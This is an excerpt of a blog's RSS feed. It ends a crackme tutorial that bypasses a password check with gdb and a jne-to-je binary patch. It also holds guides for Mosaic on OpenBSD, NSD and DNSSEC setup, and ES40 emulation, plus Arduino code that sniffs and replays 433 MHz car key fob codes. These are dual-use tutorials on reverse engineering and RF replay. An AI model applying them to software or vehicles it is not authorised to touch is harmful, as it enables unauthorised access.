79a &#60;main+44&#62;:   retq
79b &#60;main+45&#62;:   int3
End of assembler dump.
</code></pre>

<p>We&#8217;re fortunate here that gdb is aware of a function named &#8216;checkpass&#8217; - so there&#8217;s no point teasing you with the other calls that could be 
interesting but probably are not; it&#8217;s safe to assume they are printing text to stdout ;).  Let&#8217;s create a breakpoint on checkpass():</p>

<pre><code>(gdb) b checkpass
Breakpoint 2 at 0xe4f6ee00704
(gdb) c
Continuing.

Welcome to Cryogenix

Breakpoint 2, 0x00000e4f6ee00704 in checkpass ()
    from &#47;home&#47;level1&#47;level1
(gdb) disas

Dump of assembler code for function checkpass:
0x00000e4f6ee00700 &#60;checkpass+0&#62;:       push   %rbp
0x00000e4f6ee00701 &#60;checkpass+1&#62;:       mov    %rsp,%rbp
0x00000e4f6ee00704 &#60;checkpass+4&#62;:       sub    $0x10,%rsp
0x00000e4f6ee00708 &#60;checkpass+8&#62;:       lea    0xfffffffffffffff3(%rbp),%rdi
0x00000e4f6ee0070c &#60;checkpass+12&#62;:      callq  0xe4f6ee005e4 &#60;gets&#62;
0x00000e4f6ee00711 &#60;checkpass+17&#62;:      lea    0xfffffffffffffff3(%rbp),%rsi
0x00000e4f6ee00715 &#60;checkpass+21&#62;:      lea    2103524(%rip),%rdi        # 0xe4f6f002000 &#60;password&#62;
0x00000e4f6ee0071c &#60;checkpass+28&#62;:      callq  0xe4f6ee003c0 &#60;__init+112&#62;
0x00000e4f6ee00721 &#60;checkpass+33&#62;:      mov    %eax,0xfffffffffffffffc(%rbp)
0x00000e4f6ee00724 &#60;checkpass+36&#62;:      cmpl   $0x0,0xfffffffffffffffc(%rbp)
0x00000e4f6ee00728 &#60;checkpass+40&#62;:      jne    0xe4f6ee0074d &#60;checkpass+77&#62;
0x00000e4f6ee0072a &#60;checkpass+42&#62;:      lea    0xfffffffffffffff3(%rbp),%rsi
0x00000e4f6ee0072e &#60;checkpass+46&#62;:      lea    1050155(%rip),%rdi        # 0xe4f6ef00d60 &#60;__fini+1050048&#62;
0x00000e4f6ee00735 &#60;checkpass+53&#62;:      mov    $0x0,%eax
0x00000e4f6ee0073a &#60;checkpass+58&#62;:      callq  0xe4f6ee00370 &#60;__init+32&#62;
0x00000e4f6ee0073f &#60;checkpass+63&#62;:      lea    1050155(%rip),%rdi        # 0xe4f6ef00d71 &#60;__fini+1050065&#62;
0x00000e4f6ee00746 &#60;checkpass+70&#62;:      callq  0xe4f6ee003a0 &#60;__init+80&#62;
0x00000e4f6ee0074b &#60;checkpass+75&#62;:      jmp    0xe4f6ee0076c &#60;checkpass+108&#62;
0x00000e4f6ee0074d &#60;checkpass+77&#62;:      lea    0xfffffffffffffff3(%rbp),%rsi
0x00000e4f6ee00751 &#60;checkpass+81&#62;:      lea    1050151(%rip),%rdi        # 0xe4f6ef00d7f &#60;__fini+1050079&#62;
0x00000e4f6ee00758 &#60;checkpass+88&#62;:      mov    $0x0,%eax
0x00000e4f6ee0075d &#60;checkpass+93&#62;:      callq  0xe4f6ee00370 &#60;__init+32&#62;
0x00000e4f6ee00762 &#60;checkpass+98&#62;:      mov    $0x1,%edi
0x00000e4f6ee00767 &#60;checkpass+103&#62;:     callq  0xe4f6ee003f0 &#60;__init+160&#62;
0x00000e4f6ee0076c &#60;checkpass+108&#62;:     leaveq
0x00000e4f6ee0076d &#60;checkpass+109&#62;:     retq
End of assembler dump.
</code></pre>

<p>If you aren&#8217;t familiar with x86_64 assembly, here&#8217;s a commentary of what&#8217;s happening in the checkpass() function:</p>

<pre><code>700: push   %rbp
</code></pre>

<p>700: push&#47;save (to the stack) the old stack pointer stored in %rbp 
(base pointer register) onto the stack</p>

<pre><code>701: mov    %rsp,%rbp
</code></pre>

<p>701: copy the contents of the stack pointer register 
(%rsp) into the base pointer register (%rbp)</p>

<pre><code>704: sub    $0x10,%rsp
</code></pre>

<p>704: subtract 0x10 (16 decimal) from the stack pointer</p>

<pre><code>708: lea    0xfffffffffffffff3(%rbp),%rdi   
</code></pre>

<p>708: calculate and move whatever is at %rbp-13 into %rdi (register dest index)</p>

<pre><code>70c: callq  0xe4f6ee005e4 &#60;gets&#62;
</code></pre>

<p>70c: call gets() (which begins at address 0xe4f6ee005e4 - a function inside our program!)</p>

<pre><code>711: lea        0xfffffffffffffff3(%rbp),%rsi
</code></pre>

<p>711: copy %rbp-13 to %rsi (register source index)</p>

<p>By this point, input has been read from stdin and copied to $rax. This can be confirmed if you type (gdb) ni (next instruction) until after 
you are asked for the password, then: (gdb) x&#47;s $rax - examine string in the rax register.  We can also see what the lea instruction is 
actually copying by doing (gdb) x&#47;s $rbp-13 and (gdb) x&#47;s $rsi - it&#8217;s our entered password!</p>

<pre><code>715: lea    2103524(%rip),%rdi      
</code></pre>

<p>715: load whatever is at %rip+2103524 into %rdi. %rip (instruction pointer register)
addresses are relative to the instruction pointer register - i.e. the next instruction,
so are used for global variables. Whatever is at %rip+2103524 is a global var.
0xe4f6ee0071c+0x2018E4 (2103524 in hex) = 0xe4f6f002000 (gdb helpfully tells us the var
name at this address. SPOILER: (gdb) x&#47;s 0xe4f6f002000 or (gdb) x&#47;s $rip+2103524.</p>

<p><em>BIG SPOILER</em> for the impatient:
    (gdb) x&#47;s $rip+2103524
    0xe4f6f002000 <em>REDACTED</em>
    (gdb) set {char[6]}0xe4f6f002000 = &#8220;12345&#8221;
    (gdb) x&#47;s $rip+2103524
    (gdb) c</p>

<pre><code>71c: callq  0xe4f6ee003c0 &#60;__init+112&#62;  
</code></pre>

<p>71c: - this is somewhat specific to the platform compiled on (OpenBSD); in gdb, type:
(gdb) x&#47;i 0xe4f6ee003c0 - x&#47;i is shorthand for &#8216;examine instruction&#8217;. The instruction
called at that address is a jmp to __retguard - the OpenBSD stack protector.</p>

<pre><code>721: mov    %eax,0xfffffffffffffffc(%rbp)   # copy eax into %rbp-4
724: cmpl   $0x0,0xfffffffffffffffc(%rbp)   # if $0x0 = %rbp-4 [set zero flag]:
728: jne    0xe4f6ee0074d           # If not equal, jump to 74d (incorrect password)
</code></pre>

<p>If you didn&#8217;t opt for the <em>SPOILER</em> or <em>BIG SPOILER</em>, we have another opportunity to win this level,
though it is a little sloppy - and is a bit of a &#8216;cheat&#8217;.</p>

<p>We now Know that there is a jne instruction at 0xe4f6ee00728 that decides whether the password we entered is correct or not;
assembly language is assembled into machine language - which, among other things, contains our assembly instructions
as opcodes. Opcodes are specific to each CPU architecture.</p>

<p>If you study Intel architecture manuals, you will find that jne (jnz in intel syntax) is a one-byte op-code. If you don&#8217;t have
a reference handy, use gdb to examine the first byte at address 0xe4f6ee00728:</p>

<pre><code>(gdb) x&#47;1bx 0x00000678b7200728
0x678b7200728 &#60;checkpass+40&#62;:   0x75
</code></pre>

<p>So our opcode for jne&#47;jnz is 0x75.  To save you looking it up, I can tell you that the opcode for the opposing instruction - je&#47;jz - is 0x74.
We are going to change the instruction, not in memory this time, but in the actual executable file (I told you it was sloppy). </p>

<p>To find the physical offset of our instruction, it is necessary to view the Elf headers (assuming you are using an OS which uses the Elf format for executables); for this we can use readelf (part of binutils):</p>

<pre><code>$ readelf -l level1
</code></pre>

<p>We are looking for a LOAD header with the executable (E) flag:</p>

<pre><code>Type  Offset             VirtAddr           PhysAddr           FileSiz            MemSiz              Flags  Align
LOAD  0x0000000000000000 0x0000000000000000 0x0000000000000000 0x00000000000007ae 0x00000000000007ae  R E    100000
</code></pre>

<p>Our offset, virtual address and physical address are all 0x0 - so 0x00000678b7200728 (virtual&#47;memory address) is equal to 0x00000728 (physical address). If the Offset was a different value, or if VirtAddr and PhysAddr differed - you would need to do some hexadecimal arithmetic. </p>

<p>Using xxd, we can view 16 bytes starting at 0x00000678b7200720 which will include our instruction at *728:</p>

<pre><code>$ xxd -s 0x720 -l 16 level1
00000720: ff89 45fc 837d fc00 7523 488d 75f3 488d  ..E..}..u#H.u.H.
</code></pre>

<p>Or, if you prefer hexdump(1):</p>

<pre><code>$ hexdump -C -s 0x720 -n 16 level1
00000720  ff 89 45 fc 83 7d fc 00  75 23 48 8d 75 f3 48 8d  |..E..}..u#H.u.H.|
</code></pre>

<p>There are two 0x75 bytes listed, so count along from 0x720 to 0x728 to confirm which is the opcode we are looking for.</p>

<p>We could do something fancy in a ksh script and xxd, but I think you&#8217;ve been through enough for level1 - so we will edit the file using Vim:</p>

<pre><code>$ vim -b level1
:set syntax=xxd
:%!xxd
</code></pre>

<p>Move down to 00000720, find our lucky number 75 and change it to 74.  Next use xxd&#8217;s reverse (-r) option and save the file:</p>

<pre><code>:%!xxd -r
:wq
</code></pre>

<p>Confirm that the changes were made:</p>

<pre><code>$ xxd -s 0x720 -l 16 level1
00000720: ff89 45fc 837d fc00 7423 488d 75f3 488d  ..E..}..u#H.t.H.
</code></pre>

<p>Brilliant! Now to test:</p>

<pre><code>$ .&#47;level1

Welcome to Cryogenix
Password: yourmum

yourmum is correct!

Secret stuff
</code></pre>

<p>We&#8217;re covered quite a lot in this short tutorial, particularly if you weren&#8217;t familiar with the tools we used.  I suggest you read the man pages for them all so you can familiarise yourself fully with them before trying the yet-to-be-released level2!</p>

<p>level1 was written in a way that it could be solved through a number of methods - this tutorial covered a couple of them.  There are intentional vulnerabilities in the code which could be exploited and will be covered in a separate line of tutorials, but the <em>biggest spoiler</em> of them all is that you could have solved this level simply by viewing the strings in our executable file:</p>

<pre><code>$ strings level1 | tail -n 5
</code></pre>

<p>Oops!</p>

<p>I hope you enjoyed this lesson, and appreciate any feedback or ideas for subsequent levels and tutorials. Apologies for any technical errors, AT&#38;T syntax is not my native language.</p>

]]></description>
</item>

<item>
<guid>/articles/openbsd_ncsa_mosaic.html</guid>
<link>/articles/openbsd_ncsa_mosaic.html</link>
<pubDate>Sat, 03 Nov 2018 00:00:00 +0000</pubDate>
<title>NCSA Mosaic 2.7 on OpenBSD</title>
<description><![CDATA[

<h1 id="ncsa-mosaic-2.7-on-openbsd">NCSA Mosaic 2.7 on OpenBSD</h1>

<p>A classic web browser, now available on OpenBSD</p>

<p>Added OpenBSD support and upgraded the archaic libpng code so you too can enjoy this historic web browser. NCSA&#8217;s site causes a coredump, so run the binary with another URL as an argument. It&#8217;s not great as a browser on the modern web, but it does make a great gopher client!</p>

<p>Now using Cameron Kaiser&#8217;s patches and alternative (&#8216;modern&#8217;) renderer.  This needs a serious code audit before even considering submitting to ports.</p>

<pre><code>$ git clone https:&#47;&#47;github.com&#47;danielnechtan&#47;mosaic-CK-openbsd
$ doas pkg_add motif
$ cd mosaic-CK-openbsd &#38;&#38; make openbsd
$ src&#47;Mosaic gopher:&#47;&#47;gopher.club
</code></pre>

<p><a href="/fvwm.png"><img src="/fvwm.png" alt="Mosaic Screenshot" /></a>
<img src="/mosaic-ck.png" alt="Mosaic Screenshot" />
<img src="/mosaic-ck-2.png" alt="Mosaic Screenshot 2" /></p>

]]></description>
</item>

<item>
<guid>/articles/openbsd_nameserver.html</guid>
<link>/articles/openbsd_nameserver.html</link>
<pubDate>Wed, 31 Oct 2018 00:00:00 +0000</pubDate>
<title>OpenBSD as an authoritative DNS nameserver</title>
<description><![CDATA[

<h1 id="openbsd-as-an-authoritative-dns-nameserver">OpenBSD as an authoritative DNS nameserver</h1>

<p>Configuring NSD on OpenBSD as an authoritative DNS nameserver</p>

<p>OpenBSD ships with the <a href="https://nlnetlabs.nl/projects/nsd/about/">NLnet Labs Name Server Daemon</a> - <a href="http://man.openbsd.org/nsd">nsd(8)</a>, a fast and secure (DNSSEC-enabled) implementation of an authoritative DNS nameserver.</p>

<p>First we should generate a <a href="https://en.wikipedia.org/wiki/TSIG">TSIG</a> (Transaction SIGnature) key. If using hmac-md5:</p>

<pre><code>dd if=&#47;dev&#47;urandom of=&#47;dev&#47;stdout count=1 bs=32 | openssl base64
</code></pre>

<p>Or for sha256 (preferred):</p>

<pre><code>dd if=&#47;dev&#47;urandom of=&#47;dev&#47;stdout count=1 bs=64 | openssl base64
</code></pre>

<p>Keep the resulting base64-encoded key for later.  For demonstration purposes I will be using the following sha256 key:</p>

<pre><code>0i96GKeAPxwGZ2ALxrvM882oL107NuCnXLjv4PRpzCS31oySYILYzbs02Aes0OqCgy5+rA96YGep2xFWmzsKHg==
</code></pre>

<p>Open <strong>&#47;var&#47;nsd&#47;etc&#47;nsd.conf</strong> and create a simple configuration for our example domain:</p>

<pre><code>server:
        hide-version: yes
        verbosity: 1
        database: "" # disable database

remote-control:
        control-enable: yes
        control-interface: &#47;var&#47;run&#47;nsd.sock
        server-key-file: "&#47;var&#47;nsd&#47;etc&#47;nsd_server.key"
        server-cert-file: "&#47;var&#47;nsd&#47;etc&#47;nsd_server.pem"
        control-key-file: &#47;var&#47;nsd&#47;etc&#47;nsd_control.key"
        control-cert-file: "&#47;var&#47;nsd&#47;etc&#47;nsd_control.pem"

key:
   name: "sec_key"
   algorithm: hmac-sha256 # or hmac-md5
   secret: "0i96GKeAPxwGZ2ALxrvM882oL107NuCnXLjv4PRpzCS31oySYILYzbs02Aes0OqCgy5+rA96YGep2xFWmzsKHg=="

zone:
        name: "foresthall.org.uk"
        zonefile: "master&#47;foresthall.org.uk"
        notify: 192.0.2.69 sec_key
        provide-xfr: 192.0.2.69 sec_key
</code></pre>

<p>The IP in the last two lines should be that of your slave. If you are configuring the slave, this IP should be that of the master.</p>

<p>The default base location (OpenBSD users rarely deviate from good defaults!) for zonefiles is <strong>&#47;var&#47;nsd&#47;zones</strong> so we create the file <strong>&#47;var&#47;nsd&#47;zones&#47;master&#47;foresthall.org.uk</strong>:</p>

<pre><code>$ORIGIN foresthall.org.uk.    ; default zone domain
$TTL 86400                    ; default time to live

@ IN SOA ns1.cryogenix.net. foresthall.org.uk. (
           2018010203  ; serial number
           28800       ; Refresh
           7200        ; Retry
           864000      ; Expire
           86400       ; Min TTL
           )

        NS      ns1.cryogenix.net.
        NS      ns2.cryogenix.net.
@        MX    10 mail.foresthall.org.uk.
www     IN      A       82.35.249.157
mail    IN      A       82.35.249.157
@       IN      A       82.35.249.157
</code></pre>

<p>See <a href="https://tools.ietf.org/rfc/rfc1034.txt">RFC 1034</a> and <a href="https://tools.ietf.org/rfc/rfc1035.txt">RFC 1035</a> if you are unfamiliar with the zone file format.</p>

<p>Next generate the SSL keys for nsd(8):</p>

<pre><code>$ doas nsd-control-setup
setup in directory &#47;var&#47;nsd&#47;etc
generating nsd_server.key
Generating RSA private key, 3072 bit long modulus
.++
...............++
e is 65537 (0x10001)
generating nsd_control.key
Generating RSA private key, 3072 bit long modulus
.........................++
..++
e is 65537 (0x10001)
create nsd_server.pem (self signed certificate)
create nsd_control.pem (signed client certificate)
Signature ok
subject=&#47;CN=nsd-control
Getting CA Private Key
Setup success. Certificates created. Enable in nsd.conf file to use
</code></pre>

<p>Check your configuration file contains no errors - this is good practice on a live production server before reloading the config:</p>

<pre><code>$ doas nsd-checkconf &#47;var&#47;nsd&#47;etc&#47;nsd.conf
</code></pre>

<p>Run nsd(8) in the foreground to check everything is working:</p>

<pre><code>    $ doas nsd -d -V 5
    [2018-10-31 15:51:02.541] nsd[12021]: notice: nsd starting (NSD 4.1.25)
    [2018-10-31 15:51:02.542] nsd[12021]: info: creating unix socket &#47;var&#47;run&#47;nsd.sock
    [2018-10-31 15:51:02.633] nsd[76579]: info: zone foresthall.org.uk read with success
    [2018-10-31 15:51:02.711] nsd[76579]: notice: nsd started (NSD 4.1.25), pid 12021
</code></pre>

<p>Now use dig(1) to check that it is serving lookup requests for our new domain:</p>

<pre><code>voyager$ dig @ns1.cryogenix.net ANY foresthall.org.uk
;; Truncated, retrying in TCP mode.

; &#60;&#60;&#62;&#62; DiG 9.4.2-P2 &#60;&#60;&#62;&#62; @ns1.cryogenix.net ANY foresthall.org.uk
; (1 server found)
;; global options:  printcmd
;; Got answer:
;; -&#62;&#62;HEADER&#60;&#60;- opcode: QUERY, status: NOERROR, id: 48761
;; flags: qr aa rd; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; QUESTION SECTION:
;foresthall.org.uk.             IN      ANY

;; ANSWER SECTION:
foresthall.org.uk.      86400   IN      SOA     ns1.cryogenix.net. foresthall.org.uk. 2018010203 28800 7200 864000 86400
foresthall.org.uk.      86400   IN      NS      ns1.cryogenix.net.
foresthall.org.uk.      86400   IN      MX      10 mail.foresthall.org.uk.
foresthall.org.uk.      86400   IN      A       82.35.249.157

;; ADDITIONAL SECTION:
mail.foresthall.org.uk. 86400   IN      A       82.35.249.157

;; Query time: 44 msec
;; SERVER: 82.35.249.157#53(82.35.249.157)
;; WHEN: Wed Oct 31 15:52:25 2018
;; MSG SIZE  rcvd: 155
</code></pre>

<p>ctrl-C to kill the nsd foreground process then enable and start it as a daemon:</p>

<pre><code>rcctl enable nsd
rcctl start nsd
</code></pre>

<p>That&#8217;s it! But we haven&#8217;t enabled DNSSEC for our zone&#8230;</p>

<h4 id="signing-our-zone-with-dnssec">Signing our zone with DNSSEC</h4>

<p>For this we will need ldns-keygen from <a href="https://www.nlnetlabs.nl/projects/ldns/about/">LDNS</a>:</p>

<pre><code>$ doas pkg_add ldns-utils
</code></pre>

<p>Now we generate keys - a zone-signing key (ZSK) and a key-signing key (KSK):</p>

<pre><code>$ cd &#47;var&#47;nsd&#47;zones
$ export ZSK=`&#47;usr&#47;local&#47;bin&#47;ldns-keygen -a RSASHA512 -b 2048 foresthall.org.uk`
$ export KSK=`&#47;usr&#47;local&#47;bin&#47;ldns-keygen -k RSASHA512 -b 4096 foresthall.org.uk`
</code></pre>

<p>DS records were automagically generated, but we will create our own later so delete them:</p>

<pre><code>$ rm *.ds
</code></pre>

<p>Create a signed zone for foresthall.org.uk - this will create master&#47;foresthall.org.uk.signed:</p>

<pre><code>$ ldns-signzone -n -s $(head -n 1000 &#47;dev&#47;urandom | sha256 | cut -b 1-16) master&#47;foresthall.org.uk $ZSK $KSK
</code></pre>

<p>Change foresthall.org.uk&#8217;s zonefile in <strong>&#47;var&#47;nsd&#47;etc&#47;nsd.conf</strong> to the new signed file:</p>

<pre><code>zonefile: foresthall.org.uk.signed
</code></pre>

<p>Reload our nsd configuration</p>

<pre><code>$ nsd-control reconfig
$ nsd-control reload foresthall.org.uk
</code></pre>

<p>Now if we lookup our zone with dig, this time specifying DNSKEY, we should get different results that with the DNSSEC sigs:</p>

<pre><code>dig DNSKEY @ns2.cryogenix.net foresthall.org.uk. +multiline +norec
</code></pre>

<p>Generate DS records for our zone and save the result to your clipboard or somewhere:</p>

<pre><code>$ ldns-key2ds -n -f -2 master&#47;foresthall.org.uk.signed
foresthall.org.uk.      86400   IN      DS      28892 7 2 fa1b31305013e427a8dac5318fbf6ffcdbfda94309ddf12ebdca101a5e07167d
foresthall.org.uk.      86400   IN      DS      28316 10 2 1e38d492215cd05a28b8ea64eaf42c82648064b7c563b7ea27eddd9a7e8d69d3
</code></pre>

<p>These records must be added at TLD level - as we&#8217;re using a .org.uk domain, we are covered by nominet&#8217;s dns*.nic.uk.  Your domain registrar may have a form in their control panel for you to add these DS records, else you may have to contact their customer services. Once the keys have been added, you can check them using dig:</p>

<pre><code>$ dig DS foresthall.org.uk. +trace +short | egrep &#39;^DS&#39;
DS 28316 10 2 1E38D492215CD05A28B8EA64EAF42C82648064B7C563B7EA27EDDD9A 7E8D69D3 from server dns1.nic.uk in 29 ms.
DS 28892 7 2 FA1B31305013E427A8DAC5318FBF6FFCDBFDA94309DDF12EBDCA101A 5E07167D from server dns1.nic.uk in 29 ms.
</code></pre>

<p>The easiest way to verify everything is working is to check the domain on <a href="https://en.internet.nl/">internet.nl</a>.</p>

<p>Unfortunately, this setup requires maintenance - the DNSSEC signatures will expire in four weeks (thanks <a href="https://twitter.com/Habbie">@Habbie</a>!), so some hackery with shell scripts and cron jobs is probably the best solution until something more robust is included in OpenBSD.  One such example is <a href="https://github.com/wekers/Sign-DNSSEC">sign-DNSSEC</a>.</p>

<p>Update: Callum Smith, author of <a href="https://github.com/cullum/dank-selfhosted/">dank-selfhosted</a> has a very clean script which can be run in a cron nightly <a href="https://github.com/cullum/dank-selfhosted/blob/master/roles/nsd/files/resign-zone.sh">here</a></p>

<p>To setup a slave, follow this procedure again - but replace the allow-notify and request-xfr IP with that of the master nameserver.  Once both are up and running, use nsd-control(8) with the force_transfer command to test a zone transfer.</p>

]]></description>
</item>

<item>
<guid>/articles/arduino_433mhz.html</guid>
<link>/articles/arduino_433mhz.html</link>
<pubDate>Thu, 01 Aug 2013 00:00:00 +0100</pubDate>
<title>433 Mhz vehicle unlocking with Arduino Duo</title>
<description><![CDATA[

<h1 id="433-mhz-vehicle-unlocking-with-arduino-duo">433 Mhz vehicle unlocking with Arduino Duo</h1>

<p>Having only one key fob for the van is anxiety-inducing in case it fails, so I decided to build a replacement with an Arduino&#47;ATMega and a 433Mhz transceiver module.</p>

<p>Resources:</p>

<ul>
<li><a href="https://github.com/ninjablocks/433Utils">433Utils library by ninjablocks</a></li>
<li><a href="https://github.com/sui77/rc-switch">Alternative rc-switch library</a></li>
</ul>

<p>This was originally for a YouTube video which you can watch at <a href="https://www.youtube.com/watch?v=ANQsj8KCzRc">https:&#47;&#47;www.youtube.com&#47;watch?v=ANQsj8KCzRc</a>.</p>

<p><a href="https://www.youtube.com/watch?v=ANQsj8KCzRc"><img src="https://img.youtube.com/vi/ANQsj8KCzRc/0.jpg" alt="Youtube Video" /></a></p>

<p>Code:</p>

<p><strong>sniffer.c</strong></p>

<pre><code>#include

RCSwitch mySwitch = RCSwitch();

void setup() {
    Serial.begin(9600);
    mySwitch.enableReceive(0); &#47;&#47; Receiver on inerrupt 0 =&#62; that is pin #2
}

void loop() {

    if (mySwitch.available()) {
        int value = mySwitch.getReceivedValue();
            if (value == 0) {
                Serial.print("Unknown encoding");
            } else {
                Serial.print("Received ");
                Serial.print( mySwitch.getReceivedValue() );
                Serial.print(" &#47; ");
                Serial.print( mySwitch.getReceivedBitlength() );
                Serial.print("bit ");
                Serial.print("Protocol: ");
                Serial.println( mySwitch.getReceivedProtocol() );
            }
        mySwitch.resetAvailable();

    }
}
</code></pre>

<p><strong>transmitter.c</strong></p>

<pre><code>#include &#60;RCSwitch.h&#62;

#define CODE_one 10692289
#define CODE_two 10692290
#define CODE_three 10692296

const int buttonPin = 4;
const int ledPin =  13;
int buttonPushCounter = 0;
int buttonState = 0;
int lastButtonState = 0;

RCSwitch mySwitch = RCSwitch();

void setup() {
    pinMode(ledPin, OUTPUT);
    pinMode(buttonPin, INPUT);
    pinMode(7, OUTPUT);
    Serial.begin(9600);
    mySwitch.enableTransmit(7);
}

void loop() {
        buttonState = digitalRead(buttonPin);  
        if (buttonState != lastButtonState) {
          if (buttonState == HIGH) {
            buttonPushCounter++;
          }
          lastButtonState = buttonState;
           if (buttonPushCounter % 2 == 0) {
            digitalWrite(ledPin, LOW);
            mySwitch.send(CODE_one, 24);
            buttonPushCounter = 0;
          } else {
            digitalWrite(ledPin, HIGH);
            mySwitch.send(CODE_two, 24);
          }  
        }
     }
</code></pre>

]]></description>
</item>

<item>
<guid>/articles/alphaserver_es40_emu.html</guid>
<link>/articles/alphaserver_es40_emu.html</link>
<pubDate>Mon, 02 Feb 2009 00:00:00 +0000</pubDate>
<title>AlphaServer ES40 Emulation</title>
<description><![CDATA[

<h1 id="alphaserver-es40-emulation">AlphaServer ES40 Emulation</h1>

<p>Emulating an AlphaServer ES40 for running Tru64 UNIX or OpenVMS</p>

<p>This article was originally written for CentOS. Building ES40 on OpenBSD requires some extra work; I&#8217;ll port it soon and update this page in the near future. &#8211; 31-OCT-2018</p>

<p>The  <a href="http://www.es40.org/">ES40 Emulator</a>  is a portable  <a href="https://web.archive.org/web/20090606221007/http://www.compaq.com/alphaserver/es40/">AlphaServer ES40</a>  emulator. In many ways it is not unlike the Bochs IA-32 emulator in that it is portable, and provides VGA support through a VGA BIOS and the use of SDL, X11 or Win32 API calls.</p>

<p>As well as emulating a DEC Alpha AXP EV68CB CPU, the ES40 Emulator also recreated the  <a href="http://www.es40.org/Typhoon">Typhoon Chipset</a>, the  <a href="http://www.es40.org/Ali_M1543C">Ali M1543C</a>  and additional  <a href="http://www.es40.org/Devices">devices</a>  that a functioning ES40 system would require.</p>

<p>We are going to build and configure ES40 on a UNIX-like system without X11 or SDL support as we will be treating it as a virtual server and ES40 doesn&#8217;t support running DECWindows yet anyway (but feel free to configure DECWindows with XDM or X11 Forwarding later).</p>

<h3 id="prerequisites">Prerequisites</h3>

<p>As per  <a href="https://web.archive.org/web/20090606221007/http://www.es40.org/Building_the_Emulator_on_UNIX%2C_BSD%2C_Linux%2C_etc">the instructions</a>  for building ES40, you will need to make sure the following are available:</p>

<ul>
<li>  GNU C&#47;C++, make, unzip etc</li>
<li>  <a href="http://sourceforge.net/project/showfiles.php?group_id=187340&amp;package_id=218669&amp;release_id=581747">es40_018_src.zip</a></li>
<li>  <a href="https://github.com/pocoproject/poco/releases">Poco C++ Libraries (1.3.2+)</a></li>
<li>  OpenSSL&#47;LibreSSL</li>
<li>  libpcap</li>
<li>  OpenVMS 8.3 Alpha or Tru64 Installation kit (and hobbyist license from <a href="https://www.hpe.com/h41268/live/index_e.aspx?qid=24548">HPE</a>)</li>
<li>  <a href="/cl67srmrom.exe">cl67srmrom.exe</a> from <a href="https://web.archive.org/web/20090606221007/http://h18002.www1.hp.com/alphaserver/firmware/readmes/updateviaunix-es40.html">es40.zip</a> (ES40 Firmware)</li>
<li>  <a href="http://nongnu.org/vgabios/">vgabios-0.6a.bin</a>  - VGA BIOS</li>
</ul>

<h3 id="building">Building</h3>

<p>Make sure libpcap, OpenSSL&#47;LibreSSL and their respective development files are installed on your system.</p>

<p>First we need to install poco; if it is not available from your system package manager, compile from source: </p>

<pre><code>[int16h@cgxsrv01 ~]$ mkdir ES40 &#38;&#38; cd ES40
[int16h@cgxsrv01 ES40]$ wget poco-1.3.3p1.tar.gz
[int16h@cgxsrv01 ES40]$ tar zxvf poco-1.3.3p1.tar.gz
[int16h@cgxsrv01 ES40]$ cd poco-1.3.3p1
[int16h@cgxsrv01 ES40]$ .&#47;configure --omit=Data&#47;ODBC,Data&#47;MySQL
[int16h@cgxsrv01 ES40]$ make
[int16h@cgxsrv01 ES40]$ sudo make install
</code></pre>

<p>Create a new directory within ES40 called &#8220;es40-source&#8221; (or whatever you like) and place es40_018_src.zip into this directory. Unzip the archive, then we will edit the Makefile to remove any debugging flags and GUI options (as we are going for a headless &#8216;production&#8217; server).</p>

<pre><code>[int16h@cgxsrv01 ES40]$ mkdir es40-source
[int16h@cgxsrv01 ES40]$ unzip es40_018_src.zip -d es40-source&#47; &#38;&#38; cd es40-source
[int16h@cgxsrv01 es40-source]$ vi Makefile
</code></pre>

<p>Navigate down to the <strong>CTUNINGFLAGS</strong> section and replace &#8216;generic&#8217; with your target CPU (this is optional)</p>

<pre><code># CTUNINGFLAGS - tuning options for the compiler
#       
# Samples for g++ on x86:
#  -O3   -- optimize at level 3
#  -mtune=   -- cpu is one of:  generic, core2, athlon64, pentium4, etc
# 
CTUNINGFLAGS = -O3 -mtune=generic
</code></pre>

<p>By default, ES40 will compile with &#8220;<strong>-g -DHIDE_COUNTER -DDEBUG_BACKTRACE</strong>&#8221; there are many other options which are listed below, but to help improve performance I will remove all debug flags. You may include any you like, but this is being set up as if it was a production-testing server.</p>

<pre><code># CDEBUGFLAGS - turn on debugging in ES40
#
# Supported flags:
#   -g                          Include information for gdb
#   -DHIDE_COUNTER          Do not show the cycle counter
#   -DDEBUG_VGA             Turn on VGA Debugging
#   -DDEBUG_SERIAL          Turn on Serial Debugging
#   -DDEBUG_IDE             Turn on all IDE Debugging.
#   -DDEBUG_IDE_   Turn on specific IDE debugging.  Options are:
#                               BUSMASTER, COMMAND, DMA, INTERRUPT, REG_COMMAND,
#                               REG_CONTROL, PACKET
#   -DDEBUG_UNKMEM          Turn on unknown memory access debugging
#   -DDEBUG_PCI             Turn on PCI Debugging
#   -DDEBUG_TB              Turn on Translation Buffer debugging
#   -DDEBUG_PORTACCESS  Turn on i&#47;o port access debugging
#   -DDEBUG_SCSI            Turn on SCSI debugging
#   -DDEBUG_KBD             Turn on keyboard debugging
#   -DDEBUG_PIC             Turn on Programmable Interrupt Controller debugging
#   -DDEBUG_LPT         Turn on debugging for LPT Port
#   -DDEBUG_USB         Turn on debugging for USB controller
#   -DDEBUG_SYM         Turn on debugging for Sym53C810 controller
#   -DDEBUG_DMA         Turn on debugging for DMA controller
#   -DDEBUG_BACKTRACE   Turn on backtrace dump on SIGSEGV
#
CDEBUGFLAGS = -g -DHIDE_COUNTER -DDEBUG_BACKTRACE
</code></pre>

<p>I will comment out the flags at the CDEBUGFLAGS line.</p>

<pre><code>CDEBUGFLAGS = # -g -DHIDE_COUNTER -DDEBUG_BACKTRACE
</code></pre>

<p>Next we will remove support for SDL and X11 as we will use a virtual serial console connection over telnet.</p>

<pre><code># ES40 Options
#
# -DHAVE_SDL            Use the SDL Library for GUI
# -DHAVE_X11            Use X11 for GUI
# -DHAVE_PCAP           Use Networking via PCAP
# -DHAVE_NEW_FP     Use the new floating-point code (with traps,
#                   ut unfortunately, also with bugs)
#
OPTIONS = -DHAVE_SDL -DHAVE_X11 -DHAVE_PCAP
</code></pre>

<p>Make the &#8220;OPTIONS&#8221; section look like the following:</p>

<pre><code>OPTIONS = -DHAVE_PCAP
</code></pre>

<p>Finally save the file and exit. Type &#8216;make&#8217; to begin compilation.</p>

<pre><code>[int16h@cgxsrv01 es40-source]$ make
</code></pre>

<p>ES40 will now compile, don&#8217;t worry about the warnings. Once it&#8217;s complete, we will move the binary and default configuration file to a new directory:</p>

<pre><code>[int16h@cgxsrv01 es40-source]$ mkdir ..&#47;es40
